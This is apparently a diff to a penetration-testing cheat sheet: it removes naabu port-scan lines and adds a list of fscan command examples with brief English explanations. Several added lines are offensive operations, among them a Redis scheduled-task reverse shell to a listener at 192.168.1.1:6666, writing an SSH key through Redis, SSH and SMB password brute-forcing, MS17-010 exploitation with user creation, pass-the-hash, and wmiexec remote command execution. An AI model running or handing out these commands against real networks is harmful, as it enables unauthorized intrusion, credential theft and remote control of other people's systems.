@@ -9,8 +9,24 @@ $HOME/rustscan.toml
 # static portable nmap linux
 tar xvzf nmap-7.94SVN-x86_64-portable.tar.gz && ./run-nmap.sh -sV -Pn -p0- 172.16.179.160,164-169 -T4
 
-# naabu
-nabuu -host <TARGET_IP> -top-ports 100 -no-stdin
-
-# naabu scan uploaded list file
-Expand-Archive naabu_<VERSION>_windows_amd64.zip; ./naabu_<VERSION>_windows_amd64/naabu.exe -list hosts.txt -p - -no-stdin
+# fscan
+fscan.exe -h 192.168.1.1
+fscan.exe -h 192.168.1.1/24
+fscan.exe -h 192.168.1.1/24 -np -no -nopoc(Skip survival detection, do not save output result, skip web poc scanning)
+fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (Redis write public key)
+fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (Redis scheduled task rebound shell)
+fscan.exe -h 192.168.1.1/24 -c whoami (Execute ssh command)
+fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (Specify ssh module and port)
+fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (Load the specified file and password to blast
+fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (Specify the path to save the scan results, which is saved in the current path by default) 
+fscan.exe -h 192.168.1.1/8  192.x.x.1 and 192.x.x.254 of segment A, convenient for quickly viewing network segment information )
+fscan.exe -h 192.168.1.1/24 -m smb -pwd password (Smb password crash)
+fscan.exe -h 192.168.1.1/24 -m ms17010 (Specified ms17010 module)
+fscan.exe -hf ip.txt  (Import target from file)
+fscan.exe -u http://baidu.com -proxy 8080 (Scan a url and set http proxy http://127.0.0.1:8080)
+fscan.exe -h 192.168.1.1/24 -nobr -nopoc (Do not blast, do not scan Web poc, to reduce traffic)
+fscan.exe -h 192.168.1.1/24 -pa 3389 (Join 3389->rdp scan)
+fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (Proxy only supports simple tcp functions, and libraries with some functions do not support proxy settings)
+fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (Built-in functions such as adding users are only applicable to alternative tools, and other special tools for using ms17010 are recommended)
+fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (Hash collision)
+fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx(Wmiexec module no echo command execution)
